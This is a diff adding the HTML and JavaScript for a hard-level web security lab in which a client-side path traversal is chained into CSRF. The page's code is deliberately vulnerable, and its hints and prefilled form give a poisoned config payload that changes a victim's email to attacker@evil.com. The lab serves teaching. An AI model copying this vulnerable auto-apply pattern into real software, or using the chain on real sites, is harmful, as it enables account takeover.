@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Lab: CSPT to CSRF (CSPT2CSRF) - Level 4</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="lab-page">
+
+  <div class="lab-toolbar">
+    <a href="/dashboard">&larr; Back to Dashboard</a>
+    <div class="lab-info">
+      <span class="lab-name">CSPT #4: CSPT to CSRF (CSPT2CSRF)</span>
+      <span class="difficulty hard">Hard</span>
+    </div>
+  </div>
+
+  <div id="solve-banner" class="solve-banner"></div>
+
+  <div class="lab-content">
+    <div class="lab-sidebar">
+      <h3>Objective</h3>
+      <div class="objective">
+        <p>Change the victim's email to <code>attacker@evil.com</code> by chaining CSPT with CSRF. The settings page auto-loads config from an API and auto-applies settings. Poison the config response to trigger an email change.</p>
+        <p style="margin-top:8px;font-size:12px;color:var(--text-muted)">You must: 1) Log in as "victim" 2) Upload malicious config 3) CSPT to make the settings page load your config 4) The auto-apply triggers email change</p>
+      </div>
+
+      <h3>Hints</h3>
+      <div class="hint-section">
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 1: The auto-apply flow</button>
+        <div class="hint-content">The settings page fetches <code>/api/settings/{section}</code> and if the response contains an <code>autoApply</code> field with actions, it executes them. Actions can include API calls to change email, password, etc. The page uses cookies for auth (credentials: 'include').</div>
+
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 2: Craft the poison config</button>
+        <div class="hint-content">Upload JSON like: <code>{"section":"general","data":{"theme":"dark"},"autoApply":[{"endpoint":"/api/user/change-email","method":"POST","body":{"email":"attacker@evil.com"}}]}</code>. This makes the auto-apply mechanism call the email change endpoint.</div>
+
+        <button class="hint-btn" onclick="toggleHint(this)">Hint 3: Full attack chain</button>
+        <div class="hint-content">
+          1. Log in as victim (victim/password123)<br>
+          2. Upload the malicious config JSON<br>
+          3. Navigate to this page with <code>?section=../files/{fileId}</code><br>
+          4. The page fetches your poisoned config<br>
+          5. Auto-apply executes the email change<br>
+          6. Check the CSRF log to confirm
+        </div>
+      </div>
+
+      <h3>Attack Flow</h3>
+      <div class="source-code">
+<pre><span class="comment">// 1. Page loads settings config</span>
+<span class="function">fetch</span>('/api/settings/' + <span class="sink">section</span>)
+  .then(r => r.json())
+  .then(config => {
+    renderSettings(config);
+
+    <span class="comment">// 2. If config has autoApply, execute actions</span>
+    <span class="keyword">if</span> (config.autoApply) {
+      config.autoApply.<span class="function">forEach</span>(action => {
+        <span class="comment">// 3. Makes authenticated requests!</span>
+        <span class="function">fetch</span>(action.endpoint, {
+          method: action.method,
+          headers: {'Content-Type': 'application/json'},
+          credentials: <span class="string">'include'</span>,
+          body: JSON.stringify(action.body)
+        });
+      });
+    }
+  });
+</pre>
+      </div>
+    </div>
+
+    <div class="lab-app">
+      <div style="max-width:700px;margin:40px auto">
+
+        <!-- Login Section -->
+        <div class="lab-form" id="login-section">
+          <h2 style="margin-bottom:16px">&#128274; Login First</h2>
+          <p style="font-size:13px;color:var(--text-muted);margin-bottom:12px">You need to be logged in for the CSRF to work (cookies needed).</p>
+          <label>Username</label>
+          <input type="text" id="loginUser" value="victim">
+          <label>Password</label>
+          <input type="password" id="loginPass" value="password123">
+          <button class="btn btn-primary" onclick="doLogin()">Login</button>
+          <div id="login-status" style="margin-top:8px"></div>
+        </div>
+
+        <!-- Settings Section -->
+        <div class="lab-form">
+          <h2 style="margin-bottom:16px">&#9881; Account Settings</h2>
+          <label>Settings Section</label>
+          <div style="display:flex;gap:8px">
+            <input type="text" id="sectionInput" placeholder="general">
+            <button class="btn btn-primary" onclick="loadSection()">Load</button>
+          </div>
+        </div>
+
+        <div style="margin-top:16px">
+          <div id="settings-display" class="vuln-output" style="min-height:80px">
+            <p style="color:var(--text-muted)">Loading settings...</p>
+          </div>
+        </div>
+
+        <div id="auto-apply-log" style="margin-top:12px;display:none" class="attacker-console">
+          <div class="title">Auto-Apply Actions Executed</div>
+          <div id="apply-log"></div>
+        </div>
+
+        <hr style="border-color:var(--border);margin:24px 0">
+
+        <!-- Upload Section -->
+        <div class="lab-form">
+          <h2 style="margin-bottom:16px">&#128228; Upload Malicious Config</h2>
+          <label>Config JSON (with autoApply actions)</label>
+          <textarea id="configContent" rows="8">{
+  "section": "general",
+  "data": { "theme": "dark", "language": "en", "notifications": true },
+  "autoApply": [
+    {
+      "endpoint": "/api/user/change-email",
+      "method": "POST",
+      "body": { "email": "attacker@evil.com" }
+    }
+  ]
+}</textarea>
+          <button class="btn btn-danger" onclick="uploadConfig()">Upload Poison Config</button>
+        </div>
+
+        <div id="upload-result" style="margin-top:12px;display:none" class="attacker-console">
+          <div class="title">Upload Result</div>
+          <div id="upload-info"></div>
+        </div>
+
+        <hr style="border-color:var(--border);margin:24px 0">
+
+        <!-- CSRF Log -->
+        <div>
+          <h3 style="font-size:14px;color:var(--text-muted);margin-bottom:8px">CSRF Actions Log (server-side):</h3>
+          <div class="attacker-console">
+            <div class="title">State-Changing Actions Performed</div>
+            <div id="csrf-log">
+              <div class="log" style="color:var(--text-muted)">No actions yet...</div>
+            </div>
+          </div>
+          <button class="btn btn-secondary" onclick="refreshCsrfLog()" style="margin-top:8px">Refresh Log</button>
+        </div>
+
+        <div style="margin-top:20px;padding:16px;background:var(--bg-card);border-radius:8px">
+          <p style="font-size:13px;color:var(--text-muted)">
+            <strong>Real-world context:</strong> CSPT2CSRF is one of the most impactful client-side attacks. When an app:
+          </p>
+          <ol style="font-size:13px;color:var(--text-muted);margin-top:8px;padding-left:20px">
+            <li>Fetches configuration/data from an API endpoint using a user-controlled path</li>
+            <li>Uses the response to drive state-changing actions (auto-save, auto-apply, form submission)</li>
+            <li>Includes cookies/auth in those state-changing requests</li>
+          </ol>
+          <p style="font-size:13px;color:var(--text-muted);margin-top:8px">
+            Then an attacker can poison the response via CSPT and make the victim perform any action the API supports — email change, password change, account deletion, fund transfer.
+          </p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/js/app.js"></script>
+  <script>
+    setupLabVerification('cspt-4', 'xss');
+
+    function doLogin() {
+      var username = document.getElementById('loginUser').value;
+      var password = document.getElementById('loginPass').value;
+      fetch('/api/auth/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        body: JSON.stringify({ username, password })
+      })
+      .then(r => r.json())
+      .then(data => {
+        if (data.success) {
+          document.getElementById('login-status').innerHTML =
+            '<span style="color:var(--success)">Logged in as ' + data.user.username + ' (' + data.user.email + ')</span>';
+        } else {
+          document.getElementById('login-status').innerHTML =
+            '<span style="color:var(--danger)">Login failed</span>';
+        }
+      });
+    }
+
+    function loadSection() {
+      var section = document.getElementById('sectionInput').value;
+      location.search = '?section=' + encodeURIComponent(section);
+    }
+
+    function uploadConfig() {
+      var content = document.getElementById('configContent').value;
+      fetch('/api/upload', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: content, contentType: 'application/json' })
+      })
+      .then(r => r.json())
+      .then(data => {
+        var resultDiv = document.getElementById('upload-result');
+        resultDiv.style.display = 'block';
+        document.getElementById('upload-info').innerHTML =
+          '<div class="log">Config uploaded! File ID: ' + data.fileId + '</div>' +
+          '<div class="log">URL: ' + data.url + '</div>' +
+          '<div class="log" style="color:var(--warning)">Now load settings with: ?section=../' + data.url.replace('/api/', '') + '</div>' +
+          '<div class="log" style="color:var(--danger)">This will trigger CSPT2CSRF and change victim\'s email!</div>';
+      });
+    }
+
+    function refreshCsrfLog() {
+      fetch('/api/csrf-log')
+        .then(r => r.json())
+        .then(actions => {
+          var logEl = document.getElementById('csrf-log');
+          if (actions.length === 0) {
+            logEl.innerHTML = '<div class="log" style="color:var(--text-muted)">No actions recorded</div>';
+            return;
+          }
+          logEl.innerHTML = actions.map(a =>
+            '<div class="log' + (a.action === 'email_change' ? '" style="color:var(--danger)' : '') + '">' +
+            '[' + a.action + '] User: ' + a.user +
+            (a.newEmail ? ' | New email: ' + a.newEmail : '') +
+            (a.data ? ' | Data: ' + JSON.stringify(a.data) : '') +
+            '</div>'
+          ).join('');
+
+          // Check if email was changed to attacker
+          var emailChange = actions.find(a => a.action === 'email_change' && a.newEmail === 'attacker@evil.com');
+          if (emailChange) {
+            solveLab('cspt-4');
+          }
+        });
+    }
+
+    // Load settings on page load
+    var params = new URLSearchParams(location.search);
+    var section = params.get('section') || 'general';
+    document.getElementById('sectionInput').value = section;
+
+    // VULNERABLE: CSPT in settings fetch
+    var settingsUrl = '/api/settings/' + section;
+    fetch(settingsUrl)
+      .then(function(r) { return r.json(); })
+      .then(function(config) {
+        var display = document.getElementById('settings-display');
+        display.innerHTML =
+          '<div><strong>Section:</strong> ' + (config.section || 'N/A') + '</div>' +
+          '<div><strong>Data:</strong> <pre style="margin:4px 0">' + JSON.stringify(config.data || config, null, 2) + '</pre></div>';
+
+        // VULNERABLE: Auto-apply feature processes actions from the response
+        if (config.autoApply && Array.isArray(config.autoApply)) {
+          var applyLog = document.getElementById('auto-apply-log');
+          applyLog.style.display = 'block';
+          var logEl = document.getElementById('apply-log');
+          logEl.innerHTML = '';
+
+          config.autoApply.forEach(function(action) {
+            logEl.innerHTML += '<div class="log" style="color:var(--danger)">Executing: ' + action.method + ' ' + action.endpoint + '</div>';
+            logEl.innerHTML += '<div class="log">Body: ' + JSON.stringify(action.body) + '</div>';
+
+            // VULNERABLE: Makes authenticated requests based on response data
+            fetch(action.endpoint, {
+              method: action.method || 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              credentials: 'include',
+              body: JSON.stringify(action.body || {})
+            })
+            .then(r => r.json())
+            .then(result => {
+              logEl.innerHTML += '<div class="log" style="color:var(--success)">Result: ' + JSON.stringify(result) + '</div>';
+              // Refresh CSRF log
+              setTimeout(refreshCsrfLog, 500);
+            })
+            .catch(err => {
+              logEl.innerHTML += '<div class="log" style="color:var(--danger)">Error: ' + err.message + '</div>';
+            });
+          });
+        }
+      })
+      .catch(function(err) {
+        document.getElementById('settings-display').innerHTML =
+          '<p style="color:var(--danger)">Error: ' + err.message + '</p>';
+      });
+
+    // Auto-login if not logged in
+    fetch('/api/auth/me', { credentials: 'include' })
+      .then(r => r.json())
+      .then(data => {
+        if (data.user) {
+          document.getElementById('login-status').innerHTML =
+            '<span style="color:var(--success)">Already logged in as ' + data.user.username + ' (' + data.user.email + ')</span>';
+        }
+      })
+      .catch(() => {});
+
+    // Refresh CSRF log on load
+    setTimeout(refreshCsrfLog, 1000);
+  </script>
+</body>
+</html>
